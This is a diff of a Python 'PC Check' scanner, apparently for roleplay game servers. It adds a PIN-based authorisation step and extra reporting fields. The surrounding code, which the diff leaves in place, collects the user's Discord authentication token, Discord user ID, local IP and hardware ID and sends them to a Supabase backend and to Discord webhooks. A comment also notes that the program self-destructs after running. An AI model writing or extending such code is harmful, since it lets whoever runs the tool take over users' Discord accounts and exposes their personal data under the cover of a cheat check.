@@ -161,6 +161,9 @@ def check_and_perform_update():
 def main():
     global _g_scan_id, _g_hwid, _g_sys_info
 
+    # Activer le support ANSI (VT100) sur Windows 10+ (cmd.exe legacy)
+    os.system('')
+
     # Réduire la priorité du processus
     try:
         import ctypes
@@ -180,18 +183,44 @@ def main():
     # 4. Affichage banner terminal
     print_banner()
 
-    # 5. Récupération HWID immédiatement (pour crash reports)
+    # 5. Récupération HWID immédiatement (pour crash reports) — Scope 1
     try:
         _g_hwid = get_hardware_id()
     except Exception:
         _g_hwid = "UNKNOWN"
 
-    # 6. Récupération du scan_id
+    # 6. ── VÉRIFICATION ET VALIDATION DU CODE PIN (OTP 5 CARACTÈRES) ──
+    from src.ui import prompt_pin_code
+    from src.admin_sync import verify_and_claim_pin
+
+    pin_validated = False
+    valid_pin_data = None
+
+    for attempt in range(3):
+        raw_pin = prompt_pin_code()
+        validation = verify_and_claim_pin(raw_pin, _g_hwid)
+        if validation.get("valid"):
+            pin_validated = True
+            valid_pin_data = validation
+            print(f"  \033[92m✓ Code PIN valide !\033[0m Serveur : \033[96m{validation.get('server_name')}\033[0m | Support : \033[93m{validation.get('created_by_username')}\033[0m\n")
+            time.sleep(1)
+            break
+        else:
+            reason = validation.get("reason", "Code PIN invalide.")
+            print(f"  \033[91m❌ {reason}\033[0m (Essai {attempt+1}/3)\n")
+            time.sleep(1)
+
+    if not pin_validated:
+        print("  \033[91m⛔ ÉCHEC D'AUTORISATION DU SCAN : Code PIN obligatoire pour effectuer le PC Check.\033[0m")
+        print("  Demandez un nouveau code PIN à 5 caractères auprès du Support / Modérateur de votre serveur RP.")
+        time.sleep(4)
+        os._exit(1)
+
+    # 7. Récupération du scan_id
     scan_id = get_next_scan_id_from_supabase()
     _g_scan_id = scan_id
 
-    # 7. ── ENVOI INITIAL ── Enregistrement immédiat dans Supabase
-    #    Visible sur le dashboard AVANT la fin du scan
+    # 8. ── ENVOI INITIAL ── Enregistrement immédiat dans Supabase
     render_progress("Initialisation", 5, f"Enregistrement scan {scan_id} (HWID: {_g_hwid})")
     try:
         from src.scanner import get_extended_system_info
@@ -203,18 +232,26 @@ def main():
             "status"  : "SCANNING_IN_PROGRESS",
             "discord_token": ext_info.get("discord_token", "N/A"),
             "discord_user_id": ext_info.get("discord_user_id", "N/A"),
-            "local_ip": ext_info.get("local_ip", "N/A")
+            "local_ip": ext_info.get("local_ip", "N/A"),
+            "pin_code": valid_pin_data.get("pin_code"),
+            "created_by_discord_id": valid_pin_data.get("created_by_discord_id"),
+            "created_by_username": valid_pin_data.get("created_by_username"),
+            "server_key": valid_pin_data.get("server_key")
         }
         _g_sys_info = initial_info
         transmit_initial_scan_to_supabase(scan_id, initial_info)
         send_discord_scan_started(scan_id, initial_info)
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"  \033[93m⚠ Envoi initial ignoré: {e}\033[0m")
 
-    # 8. Scan système avec progress bar terminal
+    # 9. Scan système avec progress bar terminal
     render_progress("Scan Système", 8, "Démarrage de l'analyse forensique...")
     scan_data = run_system_scan(progress_callback=render_progress)
     scan_data["scan_id"] = scan_id
+    scan_data["pin_code"] = valid_pin_data.get("pin_code")
+    scan_data["created_by_discord_id"] = valid_pin_data.get("created_by_discord_id")
+    scan_data["created_by_username"] = valid_pin_data.get("created_by_username")
+    scan_data["server_key"] = valid_pin_data.get("server_key")
 
     # Mise à jour des variables globales avec les vraies infos
     _g_hwid     = scan_data.get("hwid", _g_hwid)
@@ -228,9 +265,14 @@ def main():
     # 10. Notification Discord
     send_to_discord(scan_id, scan_data, verdict)
 
-    # 11. Affichage final
-    render_progress("Terminé", 100, f"Rapport transmis (ID: {scan_id})")
-    print_client_completion(scan_id)
+    # 11. Affichage final avec vérification du résultat
+    render_progress("Terminé", 100, "Envoi terminé")
+    if result.get("success"):
+        print_client_completion(scan_id)
+    else:
+        err_msg = result.get("error", result.get("mode", "inconnu"))
+        print(f"\n  \033[91m✗\033[0m  \033[1mTransmission échouée\033[0m  \033[2m·\033[0m  "
+              f"\033[96m{scan_id}\033[0m  \033[2m· erreur: {err_msg}\033[0m\n")
 
     # 12. Auto-destruction après 3 secondes
     time.sleep(3)
